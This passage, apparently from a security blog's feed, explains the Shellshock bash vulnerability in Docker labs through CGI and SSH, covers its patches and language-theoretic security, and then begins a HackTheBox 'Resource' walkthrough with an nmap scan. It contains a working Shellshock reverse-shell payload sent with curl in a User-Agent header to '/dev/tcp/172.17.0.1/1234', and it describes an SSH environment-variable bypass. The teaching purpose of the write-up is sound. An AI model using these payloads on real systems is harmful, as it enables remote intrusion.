+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AllowOverride None
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># Enable CGI execution&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Options +ExecCGI
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Require all granted
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;IfModule mime_module&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ForceType application/x-httpd-cgi
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/IfModule&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/Directory&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We also need to tell the server that what files are CGI files. For that we will use the &lt;code>AddHandler&lt;/code> directive:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>AddHandler cgi-script .sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>For testing purposes, we’ll create a &lt;code>ping.sh&lt;/code> script that accepts an IP address from the client, runs &lt;code>ping&lt;/code> on it, and returns the output.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#!/usr/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>IP&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>&lt;span style="color:#fabd2f">printf&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;%s&amp;#34;&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$QUERY_STRING&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> | sed -n &lt;span style="color:#b8bb26">&amp;#39;s/^ip=\([^&amp;amp;]*\).*/\1/p&amp;#39;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PING_OUT&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>ping -c &lt;span style="color:#d3869b">2&lt;/span> -- &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$IP&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">printf&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Content-type: text/html\n\n&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">printf&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;%s&amp;#34;&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$PING_OUT&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">printf&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;\n\n&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="alert alert-note collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-info-circle">&lt;/i>
+&lt;p class="alert-heading">
+Note
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Note that we have added &lt;code>--&lt;/code> before the user input. According to &lt;a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html">POSIX&lt;/a>, anything after the &lt;code>--&lt;/code> should be considered as operands to the program. Because &lt;code>ping&lt;/code> complies with this standard, there would be no way to exploit it for command execution—if it weren&amp;rsquo;t for Shellshock.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;p>With this, now we can set up a Docker container for testing. After running Docker, send a request with the Shellshock payload inside the &lt;code>User-Agent&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl -ik &lt;span style="color:#b8bb26">&amp;#39;http://localhost:8080/cgi-bin/ping.sh?ip=google.com&amp;#39;&lt;/span> &lt;span style="color:#b8bb26">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;User-Agent: () { :; };/usr/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.0.1/1234 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/shellshock/Pasted%20image%2020250714160303.webp">&lt;/figure>
+&lt;p>This works because Apache parses the &lt;code>User-Agent&lt;/code> and assigns its value to the &lt;code>HTTP_USER_AGENT&lt;/code> environment variable. When the server spawns a new Bash process with these environment variables, our payload will be executed as well.&lt;/p>
+&lt;h3 id="secure-shell-ssh">Secure Shell (SSH)&lt;/h3>
+&lt;p>SSH is a service that can be used to securely access a shell on a remote host. We can use it to log in to a different host and execute commands in that system. You might ask: if SSH itself provides shell access, then what is the purpose of using Shellshock to get a shell? This is a valid question in most cases where SSH is configured to allow full shell access. However, there are instances where the server is configured to restrict users from accessing a normal shell. Instead, it provides a restricted shell, where only specific commands or scripts are allowed to execute as a particular user. The &lt;code>ForceCommand&lt;/code> directive in the &lt;code>sshd_config&lt;/code> file is used for this purpose. Most commonly this feature is used to run automated tasks when a specific user logs into the machine.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>Match user backup_user
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ForceCommand /usr/local/bin/backup.sh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PermitTTY no
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This directive will execute the &lt;code>backup.sh&lt;/code> script whenever the &lt;code>backup_user&lt;/code> logs in through SSH. &lt;code>backup_user&lt;/code> is only there to do the backup, and the &lt;code>PermitTTY no&lt;/code> directive ensures that the user does not get full shell access.&lt;/p>
+&lt;p>There&amp;rsquo;s also a feature in SSH that allows users to pass environment variables to the system. This also needs some additional configuration in the &lt;code>sshd_config&lt;/code> file of the server:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>PermitUserEnvironment yes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AcceptEnv USER_ENV
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With these, users can pass the &lt;code>USER_ENV&lt;/code> environment variable into the server. By default the &lt;code>PermitUserEnvironment&lt;/code> is set to &lt;code>no&lt;/code> since it can be used to bypass access restrictions in some configurations even without a Shellshock vulnerability. For example, by overwriting environment variables like &lt;code>LD_PRELOAD&lt;/code>, &lt;code>LD_LIBRARY_PATH&lt;/code>, etc., a user can load malicious shared libraries and overwrite system calls. A safer alternative is to use the &lt;code>AcceptEnv&lt;/code> directive, which allows only whitelisted environment variables to be copied into the system.&lt;/p>
+&lt;p>Now imagine an SSH server that is set up to run a shell script every time a user logs in using the &lt;code>ForceCommand&lt;/code> directive, where either the &lt;code>PermitUserEnvironment&lt;/code> or &lt;code>AcceptEnv&lt;/code> is set. If the server is using a vulnerable Bash version and we know the password of the user, then we can pass a crafted environment variable and pass it to the server using &lt;code>-o SendEnv=VAR&lt;/code>. Which will trigger Shellshock and bypass the restriction to get full shell access.&lt;/p>
+&lt;p>I have created a Docker lab setup to test this, which you can access &lt;a href="https://github.com/h4r1337/cve-labs/tree/main/CVE-2014-6271/ssh">here in my GitHub&lt;/a>.
+For this lab I created a simple bash script that will just print a welcome message and exit.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#!/usr/bin/env bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Welcome to my SSH Server&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;========================&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Maintenance: &amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Unfortunately the server is under maintenance, come back later&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">exit&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I then added these configurations in the &lt;code>/etc/ssh/sshd_config&lt;/code> file:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Enable root login&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PermitRootLogin yes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Disable TTY access&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PermitTTY no
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Allow environment variable&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AcceptEnv LANG LC_&lt;span style="color:#fe8019">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Command to execute on login.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># There&amp;#39;s no Match directive specified, so by default all &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># users will execute this script on login.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ForceCommand &lt;span style="color:#fe8019">/&lt;/span>sbin&lt;span style="color:#fe8019">/&lt;/span>welcome_script&lt;span style="color:#fe8019">.&lt;/span>sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/shellshock/Pasted%20image%2020250731145458.webp">&lt;/figure>
+&lt;p>There are more attack vectors, which we won&amp;rsquo;t explore in this blog (maybe in the future). I will list some of them here, if you want to explore it yourself:&lt;/p>
+&lt;ul>
+&lt;li>DHCP&lt;/li>
+&lt;li>Mail services&lt;/li>
+&lt;li>Open VPN&lt;/li>
+&lt;/ul>
+&lt;h2 id="mitigation">Mitigation&lt;/h2>
+&lt;p>The initial patch introduced by the maintainer of Bash didn&amp;rsquo;t fix the core issue entirely, and people started to find various other related but different parsing bugs. After Shellshock, with the new knowledge that merely having the shell parse arbitrary environment variables is exploitable, people realized that the Bash parser was an attack surface. With this realization people began trying standard techniques like fuzzing to quickly find new vulnerabilities in the parser.&lt;/p>
+&lt;p>The one quick fix used to fix Shellshock was to disable function export entirely. This was done by adding the &lt;code>-p&lt;/code> flag, which makes the process run in privileged mode.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">-&lt;/span>p Turn on privileged mode&lt;span style="color:#fe8019">.&lt;/span> In this mode, the &lt;span style="color:#fe8019">$&lt;/span>ENV &lt;span style="color:#fe8019">and&lt;/span> &lt;span style="color:#fe8019">$&lt;/span>BASH_ENV files
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> are &lt;span style="color:#fe8019">not&lt;/span> processed, shell functions are &lt;span style="color:#fe8019">not&lt;/span> inherited from the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> environment, &lt;span style="color:#fe8019">and&lt;/span> the SHELLOPTS, BASHOPTS, CDPATH, &lt;span style="color:#fe8019">and&lt;/span> GLOBIGNORE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> variables, &lt;span style="color:#fe8019">if&lt;/span> they appear &lt;span style="color:#fe8019">in&lt;/span> the environment, are ignored&lt;span style="color:#fe8019">.&lt;/span> If the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shell is started with the effective user (group) id &lt;span style="color:#fe8019">not&lt;/span> equal to the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> real user (group) id, &lt;span style="color:#fe8019">and&lt;/span> the &lt;span style="color:#fe8019">-&lt;/span>p option is &lt;span style="color:#fe8019">not&lt;/span> supplied, these
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> actions are taken &lt;span style="color:#fe8019">and&lt;/span> the effective user id is set to the real user
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> id&lt;span style="color:#fe8019">.&lt;/span> If the &lt;span style="color:#fe8019">-&lt;/span>p option is supplied at startup, the effective user id
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> is &lt;span style="color:#fe8019">not&lt;/span> reset&lt;span style="color:#fe8019">.&lt;/span> Turning this option off causes the effective user &lt;span style="color:#fe8019">and&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> group ids to be set to the real user &lt;span style="color:#fe8019">and&lt;/span> group ids&lt;span style="color:#fe8019">.&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you remember from the &lt;a href="#Root%20Cause%20Analysis">Root Cause Analysis&lt;/a> section, shell functions are only parsed if the &lt;code>privmode&lt;/code> variable is set to 0. So this is a valid fix to Shellshock. But more often than not, developers needed this feature, and temporarily disabling function export doesn&amp;rsquo;t fix the underlying vulnerability.&lt;/p>
+&lt;p>On September 25, Florian Weimer, a researcher from Red Hat, posted an &lt;a href="https://www.openwall.com/lists/oss-security/2014/09/25/13">unofficial patch&lt;/a> addressing Shellshock and its variants. In that patch, he addressed the issue and found a general solution to it by only parsing functions if the name starts with a prefix &lt;code>BASH_FUNC_&lt;/code> and ends with a suffix &lt;code>()&lt;/code>. Soon people realized that separating shell functions into their own special namespace would fix the underlying issue, and most implementations used this prefix + suffix fix.&lt;/p>
+&lt;h2 id="beyond-shellshock">Beyond Shellshock&lt;/h2>
+&lt;h3 id="in-the-wild-exploits">In the wild exploits&lt;/h3>
+&lt;p>Considering the simplicity of the vulnerability, it is surprising that this bug remained hidden for about 25 years, dating back to version 1.03, released in September 1989. A direct follow-up question would be if anyone else knew about this vulnerability and if it was being exploited prior to its public disclosure. As in the case of Shellshock, unlike other similar (in the case of mass exploitation) vulnerabilities like the infamous Heartbleed, which leaves no trace, Shellshock activities can be clearly logged and easily detected. However, we haven&amp;rsquo;t come across any official evidence or reports of its use in public. Still, we cannot entirely rule out the possibility of in-the-wild exploitation since, if Shellshock gave attackers full system access, they would likely take measures to avoid detection and clear all the logs considering its exploitability. But it is highly unlikely that no mistakes would be made by the attackers that leave behind at least some trace of evidence.&lt;/p>
+&lt;p>Even if you argue that nation-state threat actors wouldn&amp;rsquo;t leave any traces behind, they didn&amp;rsquo;t have such advanced Opsec techniques all the time. Even today nation-states tend to make mistakes and leave traces behind on various attacks. Therefore, it is extremely doubtful that they had such techniques before 2014. And as for the case of finding the Shellshock vulnerability, &lt;a href="https://seclists.org/oss-sec/2014/q4/224">Stéphane Chazelas himself stated&lt;/a> that he did not find the vulnerability by reading Bash source code. No one in their sane mind would think of auditing Bash source code; &lt;a href="http://www.openwall.com/lists/oss-security/2014/10/07/26">as Michal Zalewski put it&lt;/a>, it wouldn&amp;rsquo;t be much better than auditing &lt;code>/bin/uname&lt;/code>. Even if you knew Bash parses arbitrary environment variables incorrectly, it would take a much greater realization to find out that this incorrect parsing of a shell environment variable poses a significant security risk.&lt;/p>
+&lt;p>In the end Shellshock is caused due to its ambiguous design and parser implementation choices, as well as its failure to maintain proper separation of code and data. Bash alone cannot be blamed for this; third parties using it for configuration made this subtle parser quirk even more severe. Which brings us to &lt;a href="https://langsec.org/">LangSec.&lt;/a>&lt;/p>
+&lt;h3 id="language-theoretic-security-and-mismorphisms">Language theoretic security and mismorphisms&lt;/h3>
+&lt;blockquote>
+&lt;p>But if you can prove that the input for program A
+constructs a turing complete grammar you have already lost.
+You cannot &amp;ldquo;fix&amp;rdquo; these bugs, as there is an infinite number of them.
+You need to fix the parsers and the languages first.&lt;/p>
+&lt;/blockquote>
+&lt;p>I think this is the right time to mention langsec research. &lt;a href="https://www.cs.dartmouth.edu/~sws/pubs/aisw2019.pdf">As this paper states&lt;/a>, &amp;ldquo;Mismorphisms—instances where predicates take on different truth values across different interpretations of reality (notably, different actors’ perceptions of reality and the actual reality)—are the source of weird instructions.&amp;rdquo;&lt;/p>
+&lt;p>The syntax used to export static variables can also be applied to export shell functions, which the interpreter then parses and executes. This broke the assumption that values in these contexts would be treated purely as data, creating a false sense of security. Third parties like Apache CGI, SSH, etc. began using this feature for managing configurations, which now contains untrusted user inputs, creating a weird machine. Adding to this is the fact that the parser is broken, allowing a user to append arbitrary commands after the function definition, which the parser then executes.&lt;/p>
+&lt;p>Seen through the langsec lens, much more can be learned about secure software development. Shellshock is a great example of how layering convenient features across components (e.g., Apache -&amp;gt; CGI -&amp;gt; Bash) builds accidental weird machines.&lt;/p>
+&lt;hr>
+&lt;p>That&amp;rsquo;s it for today. While researching this one, I found many informative discussions, articles, and research papers. All of them are listed below.&lt;/p>
+&lt;p>Go through it if you want to learn about the various perspectives and opinions of people on this incident. I especially recommend reading this particular &lt;a href="https://dwheeler.com/essays/shellshock.html">essay&lt;/a>, which goes far beyond Shellshock and provides general information as well as various measures to prevent such vulnerabilities in the future.&lt;/p>
+&lt;h4 id="references">References&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.cve.org/CVERecord?id=CVE-2014-6271">https://www.cve.org/CVERecord?id=CVE-2014-6271&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://infosecnirvana.com/attack-vectors-used-shellshock/">https://infosecnirvana.com/attack-vectors-used-shellshock/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://dwheeler.com/essays/shellshock.html">https://dwheeler.com/essays/shellshock.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells/171347#171347">https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells/171347#171347&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://seclists.org/oss-sec/2014/q3/650">https://seclists.org/oss-sec/2014/q3/650&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://httpd.apache.org/docs/2.4/howto/cgi.html">https://httpd.apache.org/docs/2.4/howto/cgi.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.openwall.com/lists/oss-security/2014/10/07/23">https://www.openwall.com/lists/oss-security/2014/10/07/23&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://lists.openwall.net/full-disclosure/2014/10/01/10">https://lists.openwall.net/full-disclosure/2014/10/01/10&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://security.stackexchange.com/questions/166903/is-there-evidence-of-shellshock-being-exploited-before-its-public-announcement">https://security.stackexchange.com/questions/166903/is-there-evidence-of-shellshock-being-exploited-before-its-public-announcement&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.cs.dartmouth.edu/~sws/pubs/aisw2019.pdf">https://www.cs.dartmouth.edu/~sws/pubs/aisw2019.pdf&lt;/a>&lt;/li>
+&lt;/ul></content></item><item><title>Resource | HackTheBox</title><link>https://h4r1337.github.io/posts/resource/</link><pubDate>Fri, 29 Nov 2024 23:35:37 +0530</pubDate><guid>https://h4r1337.github.io/posts/resource/</guid><description>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Resource">Resource&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Hard&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/4935">&lt;img src="https://www.hackthebox.com/badge/image/4935" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Resource
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Resource is a hard difficulty Linux machine that intricately covers various ways to use &lt;code>OpenSSH&lt;/code> private and public keys. It centers around the &lt;code>SSG IT Resource Center&lt;/code> which offers a ticketing service to address the IT issues (&lt;code>SSH&lt;/code> access, website and security issues, etc. ) of its customers. Upon creating a ticket through the website we can execute Local File Inclusion, trigger a reverse shell and get access to what appears to be a docker container which hosts the ticketing website. From this point, there are various clues in past tickets and left over &lt;code>SSH&lt;/code> artifacts as well as a key signing API service that will lead to pivoting through other users and escaping the docker. Finally, the machine includes various scripts detailing the functions of its ticketing service and key signing API, one of which includes a vulnerable line of code allowing for brute forcing the final &lt;code>SSH&lt;/code> key and achieving full privilege escalation.&lt;/p></description><content>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Resource">Resource&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Hard&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/4935">&lt;img src="https://www.hackthebox.com/badge/image/4935" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Resource
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Resource is a hard difficulty Linux machine that intricately covers various ways to use &lt;code>OpenSSH&lt;/code> private and public keys. It centers around the &lt;code>SSG IT Resource Center&lt;/code> which offers a ticketing service to address the IT issues (&lt;code>SSH&lt;/code> access, website and security issues, etc. ) of its customers. Upon creating a ticket through the website we can execute Local File Inclusion, trigger a reverse shell and get access to what appears to be a docker container which hosts the ticketing website. From this point, there are various clues in past tickets and left over &lt;code>SSH&lt;/code> artifacts as well as a key signing API service that will lead to pivoting through other users and escaping the docker. Finally, the machine includes various scripts detailing the functions of its ticketing service and key signing API, one of which includes a vulnerable line of code allowing for brute forcing the final &lt;code>SSH&lt;/code> key and achieving full privilege escalation.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
+&lt;p>Scanned all TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -p- -vv --min-rate &lt;span style="color:#d3869b">5000&lt;/span> 10.10.11.27 -oA nmap/ports
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> itrc.ssg.htb &lt;span style="color:#fe8019">(&lt;/span>10.10.11.27&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#fe8019">(&lt;/span>0.27s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2024-08-08 18:56:08 IST &lt;span style="color:#fe8019">for&lt;/span> 1s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2222/tcp open EtherNetIP-1 syn-ack
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enumerated open TCP ports:&lt;/p>
